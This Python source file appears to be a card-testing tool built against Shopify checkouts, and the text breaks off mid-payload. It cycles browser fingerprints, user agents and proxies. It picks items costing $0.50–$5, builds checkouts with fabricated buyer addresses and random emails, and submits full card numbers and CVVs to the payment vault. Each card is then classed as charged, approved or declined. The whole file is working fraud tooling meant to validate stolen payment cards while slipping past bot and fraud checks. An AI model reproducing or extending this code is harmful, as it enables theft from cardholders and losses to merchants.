import json
import random
import re
import time
import html
import urllib.parse
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from collections import OrderedDict

from curl_cffi.requests import Session
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("vxo")


# ──────────────────────── redaction ──────────────────────────────────
_CARD_RE = re.compile(r"\b(\d{6})\d{6,9}(\d{4})\b")

def _redact(s: str) -> str:
    try:
        return _CARD_RE.sub(r"\1******\2", str(s))
    except Exception:
        return str(s)


# ──────────────────────── config ─────────────────────────────────────
BROWSER_PROFILES = [
    "chrome124", "chrome120", "chrome116",
    "chrome110", "chrome107", "edge101",
    "safari15_5", "safari17_0",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

DEFAULT_TIMEOUT   = 12
PCI_TIMEOUT       = 12
CHECKOUT_DEADLINE = 55
PRODUCT_CACHE_TTL = 60
ACTIONS_CACHE_CAP = 256


# ──────────────────────── Enums / Result types ───────────────────────
class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


# ──────────────────────── Address database ───────────────────────────
COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james","anderson","428 W 45th St","Apt 4B","New York","US","NY","10036","+12125550100"),
    "CA": Address("john","smith","200 Kent St","","Ottawa","CA","ON","K1A 0G9","+16135550100"),
    "GB": Address("james","wilson","10 Downing St","","London","GB","ENG","SW1A 2AA","+442012345678"),
    "AU": Address("thomas","taylor","1 George St","","Sydney","AU","NSW","2000","+61212345678"),
    "DE": Address("lucas","thomas","Friedrichstr 100","","Berlin","DE","BE","10117","+493012345678"),
    "FR": Address("hugo","bernard","10 Rue de Rivoli","","Paris","FR","IDF","75001","+33112345678"),
    "NL": Address("bas","jansen","Dam 1","","Amsterdam","NL","NH","1012 JS","+31201234567"),
    "IE": Address("sean","murphy","1 Grafton St","","Dublin","IE","D","D02 Y006","+35311234567"),
    "SE": Address("erik","andersson","Vasagatan 1","","Stockholm","SE","AB","111 20","+468123456"),
    "NO": Address("olav","hansen","Karl Johans gate 1","","Oslo","NO","03","0154","+4721234567"),
    "DK": Address("lars","nielsen","Strøget 1","","Copenhagen","DK","84","1457","+4531234567"),
    "NZ": Address("jack","wilson","1 Queen St","","Auckland","NZ","AUK","1010","+6491234567"),
    "JP": Address("takashi","yamamoto","1-1-1 Marunouchi","","Tokyo","JP","13","100-0005","+81312345678"),
    "SG": Address("wei","tan","1 Raffles Place","#01-01","Singapore","SG","01","048616","+6561234567"),
    "AE": Address("ahmed","al-mansouri","Sheikh Zayed Road 1","","Dubai","AE","DU","12345","+97141234567"),
}

SHIPPING_FALLBACK_ORDER = ["CA","GB","AU","DE","FR","NL","IE","SE","NO","DK"]

EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","proton.me"]
FIRST_NAMES   = ["james","john","robert","michael","william","david","mary","patricia","jennifer","linda"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez"]


def generate_random_email() -> str:
    return (f"{random.choice(FIRST_NAMES)}{random.choice(LAST_NAMES)}"
            f"{random.randint(1, 999)}@{random.choice(EMAIL_DOMAINS)}")


def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    return COUNTRY_ADDRESSES.get(base, COUNTRY_ADDRESSES["US"])


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    return [
        COUNTRY_ADDRESSES[c]
        for c in SHIPPING_FALLBACK_ORDER
        if c.upper() != exclude_country.upper() and c in COUNTRY_ADDRESSES
    ]


# ──────────────────────── TLS Client + pool ──────────────────────────
_tls_local = threading.local()


def _get_tls_client(proxy_url: str, impersonate: str) -> "TLSClient":
    pool = getattr(_tls_local, "pool", None)
    if pool is None:
        pool = {}
        _tls_local.pool = pool

    key = (proxy_url or "", impersonate)
    client = pool.get(key)
    if client is None:
        if len(pool) > 6:
            for k, old in list(pool.items())[:-3]:
                try:
                    old.close()
                except Exception:
                    pass
                pool.pop(k, None)
        client = TLSClient(
            timeout=DEFAULT_TIMEOUT,
            proxy_url=proxy_url,
            impersonate=impersonate,
            user_agent=random.choice(USER_AGENTS),
        )
        pool[key] = client

    try:
        client.session.cookies.clear()
    except Exception:
        pass

    try:
        client.session.headers["User-Agent"] = random.choice(USER_AGENTS)
    except Exception:
        pass

    return client


class TLSClient:
    def __init__(self, timeout=DEFAULT_TIMEOUT, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout     = timeout
        self.proxy_url   = proxy_url or ""
        self.impersonate = impersonate or random.choice(BROWSER_PROFILES)
        self.user_agent  = user_agent  or random.choice(USER_AGENTS)

        kw = {"impersonate": self.impersonate, "timeout": timeout}
        if self.proxy_url:
            kw["proxy"] = self.proxy_url
        self.session = Session(**kw)
        self.session.headers.update({
            'User-Agent':                self.user_agent,
            'Accept-Language':           'en-US,en;q=0.9',
            'Accept-Encoding':           'gzip, deflate, br',
            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':                'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass


# ──────────────────────── Product cache ──────────────────────────────
_product_cache: Dict[str, Tuple[float, Tuple[str, str, str, str]]] = {}
_product_cache_lock = threading.Lock()


def _product_cache_get(key: str) -> Optional[Tuple[str, str, str, str]]:
    with _product_cache_lock:
        entry = _product_cache.get(key)
        if entry is None:
            return None
        ts, value = entry
        if time.time() - ts > PRODUCT_CACHE_TTL:
            _product_cache.pop(key, None)
            return None
        return value


def _product_cache_set(key: str, value: Tuple[str, str, str, str]) -> None:
    with _product_cache_lock:
        if len(_product_cache) > 512:
            items = sorted(_product_cache.items(), key=lambda kv: kv[1][0])
            for k, _ in items[:100]:
                _product_cache.pop(k, None)
        _product_cache[key] = (time.time(), value)


# ──────────────────────── Actions JS cache ───────────────────────────
_actions_cache: "OrderedDict[str, str]" = OrderedDict()
_actions_lock = threading.Lock()


def _actions_cache_get(url: str) -> Optional[str]:
    with _actions_lock:
        body = _actions_cache.get(url)
        if body is not None:
            _actions_cache.move_to_end(url)
        return body


def _actions_cache_set(url: str, body: str) -> None:
    with _actions_lock:
        _actions_cache[url] = body
        _actions_cache.move_to_end(url)
        while len(_actions_cache) > ACTIONS_CACHE_CAP:
            _actions_cache.popitem(last=False)


# ──────────────────────── Step 0: cheapest product ──────────────────
_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()


def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent    = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent]
        pick      = random.choice(preferred) if preferred else random.choice(candidates)
        _recent_prices[domain] = (list(recent) + [pick["price"]])[-5:]
    return pick


def find_cheapest_product(client: "TLSClient", shop_url: str,
                          min_price: float = 0.50,
                          max_price: float = 5.00) -> Tuple[str, str, str, str]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    cache_key = f"{domain}|{min_price:.2f}|{max_price:.2f}"

    cached = _product_cache_get(cache_key)
    if cached is not None:
        return cached

    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {400, 429, 500, 502, 503, 504}

    resp = None
    last_err: Optional[Exception] = None
    for attempt in range(1, 4):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("products.json attempt %d/3 net error: %s", attempt, _redact(exc))
            if attempt < 3:
                time.sleep(1.5 + random.random())
            continue

        if resp.status_code == 200:
            break
        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            logger.warning("products.json attempt %d/3: HTTP %s", attempt, resp.status_code)
            if attempt < 3:
                time.sleep(1.5 + random.random())
            continue
        raise Exception(f"products.json returned {resp.status_code}")
    else:
        raise Exception(f"products.json failed: {last_err}")

    products = resp.json().get("products", [])
    if not products:
        raise Exception("No products returned from store")

    in_range: List[Dict] = []
    fallback: List[Dict] = []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price_f = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price_f < min_price:
                continue
            entry = {
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title":      p.get("title", ""),
                "price":      v.get("price", ""),
                "price_f":    price_f,
            }
            if price_f <= max_price:
                in_range.append(entry)
            fallback.append(entry)

    fallback.sort(key=lambda x: x["price_f"])
    candidates = in_range if in_range else fallback
    if not candidates:
        raise Exception(f"No available products >= ${min_price:.2f}")

    pick = _shuffle_pick_variant(candidates, domain)
    result = (pick["title"], pick["product_id"], pick["variant_id"], pick["price"])
    _product_cache_set(cache_key, result)
    return result


# ──────────────────────── Step 1: cart → checkout ────────────────────
def add_to_cart_and_checkout(client: "TLSClient", shop_url: str,
                             variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    })
    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url  = checkout_resp.url
    checkout_html = checkout_resp.text

    m = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = m.group(1) if m else ""

    m = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(m.group(1)).strip('"') if m else ""

    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Step 2: private access token ──────────────
def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return m.group(1) if m else ""


def fetch_private_access_token(client: "TLSClient", shop_url: str,
                               checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    resp = client.get(req_url, headers={
        "accept": "*/*",
        "referer": checkout_url,
        "user-agent": "Mozilla/5.0",
    })
    return f"[{resp.status_code}] {resp.text[:120]}"


# ──────────────────────── Step 3: actions JS (HARDENED) ─────────────

_ACTIONS_PATTERNS = [
    # any actions-prefixed JS on shopifycloud CDN (versioned path-agnostic)
    r'(/cdn/shopifycloud/checkout-web/assets/[^"\']*/actions[^"\'/]*\.js)',
    # fallback — c1 path specifically (legacy)
    r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
    # absolute URL form
    r'(https://[^"\']*shopifycloud[^"\']*/actions[^"\']*\.js)',
]


def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    """Find the actions JS URL in the checkout HTML body."""
    for pattern in _ACTIONS_PATTERNS:
        m = re.search(pattern, checkout_html)
        if m:
            path = m.group(1)
            if path.startswith("http"):
                return path
            return shop_url + path
    return ""


def extract_actions_js_url_from_preloads(preloads_body: str, shop_url: str) -> str:
    """Same, but for the preloads.js JSON body."""
    for pattern in _ACTIONS_PATTERNS:
        m = re.search(pattern, preloads_body)
        if m:
            path = m.group(1)
            if path.startswith("http"):
                return path
            return shop_url + path
    return ""


def fetch_actions_js(client: "TLSClient", actions_url: str, shop_url: str) -> str:
    cached = _actions_cache_get(actions_url)
    if cached is not None:
        return cached

    resp = client.get(actions_url, headers={
        "accept": "*/*",
        "referer": shop_url + "/",
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    })
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")

    body = resp.text
    _actions_cache_set(actions_url, body)
    return body


def fetch_preloads_js(client: "TLSClient", shop_url: str, checkout_html: str) -> str:
    """
    Fallback: fetch preloads.js which enumerates all checkout assets.
    Tries the checkout-scoped URL first, then the generic one.
    """
    # try to extract the exact checkout token from the HTML to build the scoped URL
    token = ""
    m = re.search(r'/checkouts/cn/([^/?"\']+)', checkout_html)
    if m:
        token = m.group(1)

    candidates = []
    if token:
        candidates.append(f"{shop_url}/checkouts/cn/{token}/preloads.js")
        candidates.append(f"{shop_url}/checkouts/cn/{token}/preloads.js?locale=en-US")
    candidates.append(f"{shop_url}/checkouts/internal/preloads.js")
    candidates.append(f"{shop_url}/checkouts/internal/preloads.js?locale=en-US")

    for url in candidates:
        try:
            resp = client.get(url, headers={
                "accept": "*/*",
                "referer": shop_url + "/",
                "sec-fetch-dest": "script",
                "sec-fetch-mode": "no-cors",
                "sec-fetch-site": "same-origin",
            })
            if resp.status_code == 200 and resp.text:
                return resp.text
        except Exception:
            continue
    return ""


def extract_proposal_id(js_body: str) -> str:
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return m.group(1) if m else ""


def extract_submit_for_completion_id(js_body: str) -> str:
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"',
                  js_body)
    return m.group(1) if m else ""


def extract_poll_for_receipt_id(js_body: str) -> str:
    for p in [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]:
        m = re.search(p, js_body)
        if m:
            return m.group(1)
    return ""


# ──────────────────────── Extraction helpers ────────────────────────
def extract_queue_token(proposal_json: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True


def extract_stable_id(checkout_html: str) -> str:
    u = html.unescape(checkout_html)
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', u)
    return m.group(1) if m else ""


def extract_commit_sha(checkout_html: str) -> str:
    u = html.unescape(checkout_html)
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', u)
    return m.group(1) if m else ""


def extract_source_token(checkout_html: str) -> str:
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(m.group(1)).strip('"') if m else ""


def extract_identification_signature(checkout_html: str) -> str:
    u = checkout_html.replace('&quot;', '"')
    for p in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(p, u)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    return m.group(1) if m else ""


def extract_pci_session_id(pci_body: str) -> str:
    m = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return m.group(1) if m else ""


def extract_delivery_handle(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h: return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h: return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles: return handles[0]
    except Exception:
        pass
    for p in [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]:
        m = re.search(p, proposal_body)
        if m:
            return m.group(1)
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            handles = [x["signedHandle"] for x in de.get("deliveryExpectations", [])
                       if x.get("signedHandle")]
            if handles: return handles
            handles = [x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                       for x in de.get("deliveryExpectations", [])
                       if x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if handles: return handles

        dlv = seller.get("delivery", {})
        if dlv.get("__typename") == "FilledDeliveryTerms" or de_typename == "FilledDeliveryTerms":
            return []

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                           for x in expectations
                           if x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
                if handles: return handles
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    m = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return m.group(1) if m else ""


def extract_checkout_total(proposal_body: str) -> str:
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_total(proposal_body: str) -> str:
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("runningTotal", {})
                    .get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    m = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return m.group(1) if m else ""


def extract_seller_currency(proposal_body: str) -> str:
    m = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_country(proposal_body: str) -> str:
    m = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""


def extract_receipt_id(submit_body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    if m:
        return m.group(1)
    m = re.search(r'"receiptId"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return m.group(1) if m else ""


def extract_receipt_session_token(submit_body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return m.group(1) if m else ""


_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "risky": "RISK_REJECTED",
    "fraud": "RISK_REJECTED",
    "do not honor": "DO_NOT_HONOR",
    "insufficient funds": "INSUFFICIENT_FUNDS",
    "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED",
    "card_declined": "CARD_DECLINED",
    "invalid card": "CARD_INVALID",
    "expired card": "CARD_EXPIRED",
    "card expired": "CARD_EXPIRED",
    "incorrect cvc": "CVV_INVALID",
    "incorrect_cvc": "CVV_INVALID",
    "stolen card": "CARD_STOLEN",
    "pickup card": "CARD_STOLEN",
    "address": "ADDRESS_INVALID",
    "zip": "ZIP_INVALID",
    "postal": "ZIP_INVALID",
    "throttled": "RATE_LIMITED",
    "rate limit": "RATE_LIMITED",
    "gateway": "GATEWAY_ERROR",
    "inventory": "OUT_OF_STOCK",
    "out of stock": "OUT_OF_STOCK",
    "unavailable": "OUT_OF_STOCK",
    "captcha": "CAPTCHA_REQUIRED",
    "terms": "TERMS_REQUIRED",
    "payment method": "PAYMENT_METHOD_INVALID",
}


def _map_error(raw: str) -> str:
    low = raw.lower()
    for keyword, code in _SHOPIFY_ERROR_MAP.items():
        if keyword in low:
            return code
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(submit_body: str) -> str:
    for p in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(p, submit_body)
        if m:
            return _map_error(m.group(1))
    return ""


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if m:
        code = m.group(1)
        return "CAPTCHA_REQUIRED" if "CAPTCHA" in code else code
    if "CAPTCHA" in poll_body:
        return "CAPTCHA_REQUIRED"
    return "FAILED" if receipt_type == "FailedReceipt" else "UNKNOWN"


def detect_shipping_restriction(proposal_body: str) -> bool:
    signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in signals)


# ──────────────────────── Payload helpers ───────────────────────────
def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency == "USD" and country == "US":
        return payload
    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        if currency != "USD":
            payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
            payload = payload.replace('"presentmentCurrency":"USD"', f'"presentmentCurrency":"{currency}"')
        if country != "US":
            payload = payload.replace('"phoneCountryCode":"US"', f'"phoneCountryCode":"{country}"')
        return payload

    in_buyer = [False]

    def _walk(obj):
        if isinstance(obj, dict):
            out = {}
            for k, v in obj.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    out[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    out[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and in_buyer[0]:
                    out[k] = country
                elif k == "customer":
                    in_buyer[0] = True
                    out[k] = _walk(v)
                    in_buyer[0] = False
                else:
                    out[k] = _walk(v)
            return out
        if isinstance(obj, list):
            return [_walk(i) for i in obj]
        return obj

    return json.dumps(_walk(data), separators=(",", ":"))


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── Step 9: PCI ───────────────────────────────
def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "",
                     impersonate: str = "chrome124") -> Tuple[int, str]:

    endpoint = vault_url or "https://checkout.pci.shopifyinc.com/sessions"
    scope    = vault_domain or shop_domain
    origin   = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint \
               else "https://checkout.pci.shopifyinc.com"

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": scope,
    })
    headers = {
        "accept":                          "application/json",
        "content-type":                    "application/json",
        "origin":                          origin,
        "referer":                         f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-fetch-dest":                  "empty",
        "sec-fetch-mode":                  "cors",
        "sec-fetch-site":                  "same-origin",
        "sec-fetch-storage-access":        "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":                      "Mozilla/5.0",
    }

    kw = {"impersonate": impersonate, "timeout": PCI_TIMEOUT}
    if proxy_url:
        kw["proxy"] = proxy_url
    with Session(**kw) as s:
        resp = s.post(endpoint, data=payload, headers=headers)
    return resp.status_code, resp.text


# ──────────────────────── Proposal headers ──────────────────────────
def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                          "application/json",
        "accept-language":                 "en-US",
        "content-type":                    "application/json",
        "origin":                          shop_url,
        "referer":                         checkout_url,
        "sec-fetch-dest":                  "empty",
        "sec-fetch-mode":                  "cors",
        "sec-fetch-site":                  "same-origin",
        "shopify-checkout-client":         "checkout-web/1.0",
        "shopify-checkout-source":         f'id="{checkout_token}", type="cn"',
        "user-agent":                      "Mozilla/5.0",
        "x-checkout-one-session-token":    session_token,
        "x-checkout-web-build-id":         build_id,
        "x-checkout-web-deploy-stage":     "production",
        "x-checkout-web-server-handling":  "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id":        source_token,
    }


# ──────────────────────── Step 4: Proposal 1 ────────────────────────
def send_proposal(client: "TLSClient", shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
